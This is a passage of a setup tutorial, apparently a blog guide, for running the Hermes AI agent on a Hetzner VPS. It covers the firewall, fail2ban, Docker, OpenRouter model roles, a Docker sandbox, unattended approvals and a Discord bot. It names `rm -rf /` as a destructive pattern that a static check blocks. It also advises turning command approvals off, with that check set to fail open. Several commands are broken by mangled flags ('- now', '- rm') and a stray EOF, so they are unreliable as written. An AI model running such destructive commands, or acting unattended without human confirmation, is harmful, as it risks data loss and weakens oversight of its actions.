> — **Sources** are the source IPs. Press the drop-down menu and check the **Any IPv4** and **Any IPv6** presets (internally equivalent to `0.0.0.0/0` and `::/0`, but in the UI select them by name).
> — **Port** is for a single port. Enter `22`, `80` or `443`.
> — **Port range** is left **empty**. Only used for ranges like `8000–8100`. If you paste IPs there, Hetzner returns `Port is too low`.

The default ICMP rule: leave it

Hetzner automatically creates a fourth rule `Protocol: ICMP, Sources: Any IPv4 + Any IPv6`. **Keep it**. ICMP is not a service port, it is the network control protocol:

- Makes `ping` and `traceroute` work (basic diagnostics when something goes wrong).

- Supports **Path MTU Discovery**, without which VPN connections or networks with small MTUs hang silently when transferring large files.

- In IPv6, ICMPv6 includes Neighbor Discovery and Router Advertisement: if you block it, **IPv6 stops working**. It is not optional.

The risk of leaving it open is minimal (an attacker can verify that the host is alive, but your IP is already public anyway) and floods are absorbed by Hetzner's DDoS protection before reaching VPS.

> **Why does the ICMP rule have no port**? Ports are a TCP/UDP concept. ICMP identifies messages by “type” and “code” (echo request, echo reply, destination unreachable...), not by port. Hetzner disables the Port and Port range fields automatically when you select `Protocol: ICMP`. It is correct that they are empty.

Apply the firewall to the `hermes-lab` server in the **Apply to** tab of the firewall itself.

> Do not open application ports (3000, 8080, etc.). Caddy will reverse proxy at 80/443.

### 4.5. Fail2ban

Activate the default jail for SSH:

```bash
sudo systemctl enable - now fail2ban
sudo fail2ban-client status sshd
```

> ⚠️ **Important notice during the initial setup**: while you are testing SSH keys and authentication, it is very easy to trigger 5+ failed attempts in a row and have fail2ban **ban you from your own home IP**. Typical symptom: ping to the server works, but `ssh` and `Test-NetConnection -Port 22` give timeout even though the firewalls are OK.
> If this happens to you, go to the Hetzner Web Console (panel → server → Console button) and unban:

```bash

sudo fail2ban-client unban - all # desbanear todo
```

```bash

# … cuando todo funciona estable …
sudo systemctl start fail2ban
```

> Or whitelist your IP in `/etc/fail2ban/jail.local`:

```bash

ignoreip = 127.0.0.1/8 ::1 TU_IP_PUBLICA
EOF

sudo systemctl restart fail2ban
```

## 5. Install Docker and Docker Compose

### Why do we install Docker if Hermes doesn't ask for it?

In step 4.1 I said that the only manual Hermes dependency is `git`, and it's true: `install.sh` handles Python/Node/uv/ripgrep/ffmpeg in an isolated environment. **But Docker is not a dependency on Hermes**, it is a dependency on the **architecture we are building**. We need it for three reasons, all decided in later steps:

- **Agent Execution Sandbox** (`terminal.backend: docker`)

- Defined in: Step 9.1

- Without Docker: Hermes would execute commands directly on the host. You lose the first layer of insulation that justifies `approvals.mode: off`

- **Reverse proxy with automatic HTTPS** (Caddy)

- Defined in: Optional, outside the scope of this article

- Without Docker: You do not have HTTPS subdomains for the prototypes

- **Each prototype generated by Hermes**

- Defined in: Natural consequence of the container-based approach

- Without Docker: Each project would contaminate system dependencies; no isolation between prototypes

If you decided to forgo all three (`terminal.backend: local`, no Caddy, running prototypes directly on host), you could skip this section. **I do not recommend it** for a 24/7 lab — it is what differentiates “I have an agent playing with my server” from “I have an isolated project incubator”.

### And shouldn't Hermes itself run inside Docker?

It is a valid alternative and the official Hermes document at Docker (https://hermes-agent.nousresearch.com/docs/user-guide/docker). There is an official image `nousresearch/hermes-agent:latest`.

**Advantages** of the containerized option: trivial updates (`docker pull && docker compose up -d`), total host isolation, all state on a single `/opt/data` volume.

**Why our guide goes with native installation**:

- Easier to debug (direct logs, `hermes doctor`, `hermes update` work without container jumps).

- Direct access to the host filesystem for project volumes without “Docker within Docker”.

- The systemd service from step 13 wraps the native binary, which gives fine control over resource limits.

- This is what the official Quickstart (https://hermes-agent.nousresearch.com/docs/getting-started/quickstart/) does.

If you want to migrate to containerized Hermes in the future, the data from `~/.hermes/` is portable: you just need to mount it to `/opt/data` of the container.

### Install Docker (official)

You continue as `hermes`. Install Docker from the official repo:

```bash
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg - dearmor -o /etc/apt/keyrings/docker.gpg
sudo chmod a+r /etc/apt/keyrings/docker.gpg
echo "deb [arch=$(dpkg - print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
https://download.docker.com/linux/ubuntu $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
sudo usermod -aG docker hermes
```

Apply group membership `docker`

`usermod -aG docker hermes` adds your user to the `docker` group, but **groups are only loaded at login**: the current SSH session still doesn't see it. Check the status first:

```bash
groups # te lista los grupos de la sesión actual
id -nG hermes # los grupos REALES del usuario en /etc/group
```

If `groups` does not include `docker` but `id -nG hermes` does, confirm that the change is made at the system level and you just need to refresh the session.

You have three ways to do it, ordered from simplest to most surgical:

**Option 1** — **Close and reopen SSH** (**cleanest**):

```bash
exit # o Ctrl+D - cierra la sesión actual
```

And from your laptop, you enter again:

```bash
ssh -i ~/.ssh/hetzner_hermes hermes@SERVER_IP
groups # ahora debería incluir 'docker'
```

**Option 2** — **Without closing SSH**, **open a sub**-**shell with the group reloaded**:

```bash
exec sg docker -c bash
groups # incluye 'docker'
```

`sg` (switch group) launches a shell with the membership reloaded. When you exit (`exit`), you return to the original shell without group `docker`. Useful if you have open processes in the session that you don't want to lose.

**Option 3** — **Reload groups with** `**newgrp**`:

```bash
newgrp docker
groups
```

Similar to `sg` but replaces the current shell. It also comes out with `exit`.

Any of the three is fine. The most recommended is **option 1** because it is what you will do whenever you reconnect and leave everything in a clean state.

Verify that Docker works like `hermes`

```bash
docker run - rm hello-world
docker compose version
```

`hello-world` should print the welcome message from Docker. If it says `permission denied while trying to connect to the Docker daemon socket`, the group has not yet been applied: go back to the previous step and reconnect SSH.

## 8. Configure multiple models for different tasks

After the `Quick setup`, Hermes already has a **main model**. But that **doesn't** mean that it automatically configures all other roles. The important thing is to understand this separation:

- `**model**.**default**`: main model of the normal chat.

- `**delegation**`: model for subagents; if you don't define it, it inherits the parent.

- `**auxiliary**.**vision**`: multimodal tasks (captures, image analysis).

- `**auxiliary**.**compression**`: Context summaries when the conversation is compacted.

- `**fallback**_**model**`: backup model if the main one fails due to rate limit or supplier failure.

- `**agent**.**reasoning**_**effort**`: reasoning intensity; It is not another model, it is an agent adjustment.

In this guide we are going to leave it like this, everything about OpenRouter:

- **Main model**

- Configuration: `qwen/qwen3.6-plus`

- **Delegation**

- Configuration: `minimax/minimax-m2.7`

- **Auxiliary vision**

- Configuration: `google/gemini-3-flash-preview`

- **Auxiliary compression**

- Configuration: `qwen/qwen3.6-plus`

- **Fallback model**

- Configuration: `minimax/minimax-m2.7`

- **Reasoning effort**

- Configuration: `medium` (recommended) or `high`

> Use `medium` as default value. Upgrade to `high` only if you see that Hermes falls short in complex tasks.

### 8.1. Set it with `hermes config set`

There is no need to open the YAML by hand. As user `hermes`, run:

```bash
hermes config set model.provider openrouter
hermes config set model.default qwen/qwen3.6-plus
hermes config set delegation.provider openrouter
hermes config set delegation.model minimax/minimax-m2.7
hermes config set auxiliary.vision.provider openrouter
hermes config set auxiliary.vision.model google/gemini-3-flash-preview
hermes config set fallback_model.provider openrouter
hermes config set fallback_model.model minimax/minimax-m2.7
hermes config set agent.reasoning_effort medium
hermes config set display.personality technical
hermes config set display.show_reasoning true
hermes config set auxiliary.compression.provider openrouter
hermes config set auxiliary.compression.model qwen/qwen3.6-plus
hermes config set timezone Europe/Madrid
hermes config set provider_routing.sort throughput
```

After changing models, restart the gateway so that the service loads the new config:

```bash
sudo "$(command -v hermes)" gateway stop - system
sudo "$(command -v hermes)" gateway start - system
sudo "$(command -v hermes)" gateway status - system
```

If you want to verify the complete result in the file:

```bash
grep -n "default:\\|delegation:\\|fallback_model:\\|reasoning_effort:\\|personality:\\|show_reasoning:\\|timezone:\\|vision:\\|compression:" ~/.hermes/config.yaml
```

> **What is happening in that scenario**: normally it is not a timeout problem or your VPS. OpenRouter balances between several providers and, if the upstream of the chosen model is saturated or degraded, it can return `429` even if everything local is correct. That is why it is advisable to have a real `fallback_model` and, if necessary, temporarily change the main model of the interactive channel from Discord.
> It is also advisable for the **compression model** to have a large context window. If you use a compressor with less context than the main model's compression threshold, Hermes will lower the threshold for that session to make it fit. That's why we leave `qwen/qwen3.6-plus` also in compression.

### 8.2. Check how it turned out

```bash
hermes config
```

There is an important nuance here: `**hermes config**` **does not print the entire YAML**, but rather a **summary** of the main values. That's why it's normal for you to see things like:

- `Model` with the current parent (for example `qwen/qwen3.6-plus`)

- `Display` with `Personality: technical`

- `Display` with `Reasoning: on`

- `Context Compression` with the auxiliary model you have set

- `Auxiliary Models (overrides)` with `Vision`

And, on the other hand, they **do not appear explicitly** in that summary screen:

- `delegation`

- `fallback_model`

- some internal keys of `agent`

> Another confusing detail: in `hermes config`, the `**Display** → **Reasoning**` field refers to **show or hide on-screen reasoning**, **not** `agent.reasoning_effort`. They are different settings: you can have `agent.reasoning_effort: medium` with `Display → Reasoning: on` or `off`, depending on whether you want to see or hide that reasoning in the output.

To verify the complete configuration, also check the actual file:

```bash
grep -n "default:\\|delegation:\\|fallback_model:\\|reasoning_effort:\\|personality:\\|show_reasoning:\\|vision:\\|compression:" ~/.hermes/config.yaml
```

On the YAML you should have, at a minimum, something equivalent to this:

```bash
model:
  default: qwen/qwen3.6-plus

delegation:
  provider: openrouter
  model: minimax/minimax-m2.7

auxiliary:
  vision:
    provider: openrouter
    model: google/gemini-3-flash-preview
  compression:
    provider: openrouter
    model: qwen/qwen3.6-plus

fallback_model:
  provider: openrouter
  model: minimax/minimax-m2.7

agent:
  reasoning_effort: medium

display:
  personality: technical
  show_reasoning: true

timezone: Europe/Madrid
```

### 8.3. What is automatically inherited and what is not

This is what is most confusing at first:

- If you **do not** configure `delegation`, subagents inherit the parent model.

- `auxiliary.vision` and `auxiliary.compression` **do not** automatically inherit the parent model; they use their own auxiliary resolution.

- `fallback_model` **not** self-inferred: if you don't define it, there is no explicit failover.

- `agent.reasoning_effort` does not change model; just adjust how you use the chosen model.

### 8.4. Switch models without restarting

From CLI or from Discord below:

```bash
/model openrouter:qwen/qwen3.6-plus
/model openrouter:minimax/minimax-m2.7
```

Use it for spot tests. For stable behavior to survive reboots, leave the configuration persisted with `hermes config set`.

## 9. Coding skills and the Docker backend for safe execution

### 9.1. Activate the Docker backend

This causes **all commands that Hermes executes** (including `git`, `python`, `npm`, etc.) to run inside a sandbox container, not directly on the host.

If you prefer to leave it configured without touching `config.yaml` by hand, run:

```bash
hermes config set terminal.backend docker
hermes config set terminal.docker_image nousresearch/hermes-agent:latest
hermes config set terminal.docker_mount_cwd_to_workspace true
hermes config set terminal.docker_volumes '["/home/hermes/projects:/workspace/projects","/home/hermes/.hermes/cache/documents:/output"]'
hermes config set terminal.docker_forward_env '["OPENROUTER_API_KEY"]'
hermes config set terminal.container_cpu 2
hermes config set terminal.container_memory 4096
hermes config set terminal.container_persistent true
hermes config set code_execution.mode project
hermes config set code_execution.timeout 300
hermes config set code_execution.max_tool_calls 50
```

> For lists like `docker_volumes` and `docker_forward_env`, use single quotes on the outside and JSON on the inside, as in the example. So Hermes saves it correctly as an array in `config.yaml`.
> At the moment we only resend `OPENROUTER_API_KEY`. We will add `GITHUB_TOKEN` in step **9**.**2**.**4**, when we actually configure GitHub. `docker_forward_env` does not contain the actual values ​​of the secrets, but rather the **names** of the variables that Hermes must copy into the container.
> In this guide we use `nousresearch/hermes-agent:latest` as the sandbox image because the official documentation indicates that it already includes Python, Node, npm, Playwright with Chromium, `ripgrep` and `ffmpeg`. For a VPS where Hermes is going to program, navigate and automate, it is more practical to start from a general image already prepared than from a more minimal image.
> We also add this mount:

```bash
/home/hermes/.hermes/cache/documents:/output
```

> because the official documentation recommends a **host**-**visible export mount** when using messaging + backend Docker. So, if Hermes generates a file inside the container, it can write it to `/output/...` and then the host gateway sees it in `/home/hermes/.hermes/cache/documents/...` to send it via Discord, Telegram, etc.
> **Be careful with expectations**: this mount is necessary, but it does not make the attachment flow perfect when you separate **host gateway** and **sandbox execution Docker**. **At the moment it is a known limitation of Hermes**: the file bridge between sandboxed environments and end users still has gaps, so you may encounter cases where a file generated within the sandbox does not output correctly through Discord/Telegram, or where an attachment received by messaging is not accessible within the execution session. Official issue:
> https://github.com/NousResearch/hermes-agent/issues/466
> We leave `terminal.container_cpu: 2` and `terminal.container_memory: 4096` because in this tutorial we are using a **Hetzner CX32** (4 vCPU, 8 GB RAM). Reserving **2 vCPU and 4 GB** for the Docker sandbox is a reasonable middle ground: it gives enough margin for `npm`, `python`, builds, tests and browser tools without eating up all the resources of the VPS or leaving Hermes itself, the gateway and the base system without air.

```bash
# añade/edita en ~/.hermes/config.yaml
terminal:
  backend: docker
  docker_image: nousresearch/hermes-agent:latest
  docker_mount_cwd_to_workspace: true
  docker_volumes:
    - "/home/hermes/projects:/workspace/projects"
    - "/home/hermes/.hermes/cache/documents:/output"
  docker_forward_env:
    - OPENROUTER_API_KEY
  container_cpu: 2
  container_memory: 4096
  container_persistent: true

code_execution:
  mode: project
  timeout: 300
  max_tool_calls: 50
```

> Ref: Configuration → Terminal Backends (https://hermes-agent.nousresearch.com/docs/user-guide/configuration/). If when you start the gateway as a service you see a warning similar to this:

```bash
WARNING gateway.run: Docker backend is enabled for the messaging gateway but no explicit host-visible output mount …
```

It means that the container is missing just that second export mount. The correct way to avoid this is to leave `docker_volumes` as in the example above, with:

```bash
/home/hermes/.hermes/cache/documents:/output
```

### 9.3. Automatic approvals (off mode)

Since **all commands are executed inside the Docker container** from step 9.1, you can turn off approvals completely. This allows Hermes to work 100% unattended from Discord without asking you for confirmation when it launches `npm install`, `docker compose up`, `git push`, etc.

```bash
hermes config set approvals.mode off
hermes config set security.redact_secrets true
hermes config set security.tirith_enabled true
hermes config set security.tirith_timeout 5
hermes config set security.tirith_fail_open true
```

**Why it is reasonable to do it here**:

- The Docker sandbox (`terminal.backend: docker`) isolates Hermes from the VPS base system.

- What it can touch are the directories that you mount inside the container, for example `/home/hermes/projects`, so the isolation is **useful but not absolute**.

- `tirith_enabled: true` applies static analysis before executing and blocks obviously destructive patterns (e.g. `rm -rf /`).

- `redact_secrets` masks `.env`, tokens and keys before sending to LLM, so they are not leaked to OpenRouter's history.

- `DISCORD_ALLOWED_USERS` now restricts who can give orders to the agent.

- Hetzner makes daily snapshot (step 3.3): if something breaks, you restore.

> If at any point you prefer to go back to confirmations, change to `mode: smart` (Hermes asks only in the destructive, using the auxiliary model) or `mode: manual` (all confirmed). Ref: Configuration → Security & Approvals (https://hermes-agent.nousresearch.com/docs/user-guide/configuration/).

Follow docs/user-guide/messaging/discord (https://hermes-agent.nousresearch.com/docs/user-guide/messaging/discord).

In this tutorial we are only going to touch three sections of the Discord portal:

- `Información general`: to remove the `Application ID` and give the app a name/icon

The rest (`OAuth2`, `Emojis`, `Webhooks`, `Rich Presence`, `Testers`, `Verificación`) we don't need for this flow.

### 10.1. Create the app and the bot

1. Enter https://discord.com/developers/applications → **New Application** → name `Hermes Lab`.

2. In **General Information**:

- put name, icon and description if you want

- no need to touch OAuth2, Interactions Endpoint URL or any webhooks for Hermes per gateway

3. **Bot** tab:

- **Public Bot**: **OFF**.

- **Requires OAuth2 Code Grant**: **OFF**.

- **Privileged Gateway Intents**:

- ❌ **Presence Intent**: **OFF** (Hermes does not need it for this case).

- ✅ **Message Content Intent**: **ON** (required for Hermes to read the text of normal messages).

- ✅ **Server Members Intent**: **ON**. The official Hermes documentation treats it as required in order to correctly resolve allowed users and avoid identification failures.

4. **Reset Token** → copies the token (only displayed once).

> **What it means** `**Public Bot**`: If it is on `ON`, other users with sufficient permissions could invite your bot to their own servers. If you want this Hermes instance to be yours alone, leave it **OFF**.

> **What it means** `**Requires OAuth2 Code Grant**`: Leave it **OFF**. That full OAuth2 flow is not necessary for normal use of Hermes as a bot on your server and only complicates installation.
